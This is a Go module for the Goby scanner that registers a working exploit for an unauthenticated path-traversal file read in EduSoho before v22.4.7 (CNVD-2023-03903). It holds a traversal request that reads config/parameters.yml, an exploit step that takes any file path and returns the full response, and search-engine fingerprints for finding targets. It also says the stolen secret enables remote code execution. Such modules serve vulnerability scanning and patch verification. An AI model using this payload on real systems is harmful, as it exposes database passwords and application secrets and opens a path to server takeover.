package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Arbitrary file reading vulnerability of edusoho classroom-course-statistics（CNVD-2023-03903）",
    "Description": "<p>The edusoho education and training system &lt;v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing</p>",
    "Product": "EduSoho-Network-Classroom",
    "Homepage": "http://www.edusoho.com/",
    "DisclosureDate": "2022-12-15",
    "Author": "无在无不在",
    "GobyQuery": "title=\"Powered By EduSoho\" || body=\"Powered by <a href=\\\"http://www.edusoho.com/\\\" target=\\\"_blank\\\">EduSoho\" || (body=\"Powered By EduSoho\" && body=\"var app\")",
    "FofaQuery": "title=\"Powered By EduSoho\" || body=\"Powered by <a href=\\\"http://www.edusoho.com/\\\" target=\\\"_blank\\\">EduSoho\" || (body=\"Powered By EduSoho\" && body=\"var app\")",
    "Level": "3",
    "Impact": "<p>EduSoho Education and training system is an open source network school system developed by Hangzhou Kozhi Network Technology Company. The education and training system &lt;v22.4.7 has unauthorized arbitrary file reading vulnerability, through which an attacker can read the contents of the config/parameters.yml file. Get the secret value saved in the file, database account password and other sensitive information. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing</p>",
    "Translation": {
        "CN": {
            "Name": "edusoho 教培系统 classroom-course-statistics 任意文件读取漏洞（CNVD-2023-03903）",
            "Product": "EduSoho-开源网络课堂",
            "Description": "<p>EduSoho教培系统是由杭州阔知网络科技有限公司研发的开源网校系统,该教培系统&lt;v22.4.7&nbsp;存在未授权任意文件读取漏洞，通过该漏洞攻击者可以读取到config/parameters.yml文件的内容，拿到该文件中保存的secret值以及数据库账号密码等敏感信息。拿到secret值后，攻击者可以结合symfony框架_fragment路由实现RCE<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复补丁：<a href=\"https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,\">https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,</a> 升级版本到22.4.7即可<br></p>",
            "Impact": "<p>通过该漏洞攻击者可以读取到config/parameters.yml文件的内容，拿到该文件中保存的secret值以及数据库账号密码等敏感信息。拿到secret值后，攻击者可以结合symfony框架_fragment路由实现RCE</p>",
            "VulType": [
                "命令执行",
                "目录遍历",
                "文件读取"
            ],
            "Tags": [
                "命令执行",
                "目录遍历",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Arbitrary file reading vulnerability of edusoho classroom-course-statistics（CNVD-2023-03903）",
            "Product": "EduSoho-Network-Classroom",
            "Description": "<p>The edusoho education and training system &lt;v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing<br></p>",
            "Recommendation": "<p>Vendor has released leaks fixes: <a href=\"https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,\">https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,</a> upgrade to version 22.4.7 can<br></p>",
            "Impact": "<p>EduSoho Education and training system is an open source network school system developed by Hangzhou Kozhi Network Technology Company. The education and training system &lt;v22.4.7 has unauthorized arbitrary file reading vulnerability, through which an attacker can read the contents of the config/parameters.yml file. Get the secret value saved in the file, database account password and other sensitive information. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing<br></p>",
            "VulType": [
                "Command Execution",
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "Command Execution",
                "Directory Traversal",
                "File Read"
            ]
        }
    },
    "CNVD": [
        "CNVD-2023-03903"
    ],
    "CNNVD": [
        ""
    ],
    "Is0day": false,
    "References": [
        "code review by myself"
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "secret",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../../../config/parameters.yml"
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/export/classroom-course-statistics?fileNames[]={{{filename}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "VulType": [
        "Command Execution",
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "9.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Recommendation": "<p>Vendor has released leaks fixes: <a href=\"https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,\">https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b,</a> upgrade to version 22.4.7 can</p>",
    "Tags": [
        "Command Execution",
        "Directory Traversal",
        "File Read"
    ],
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}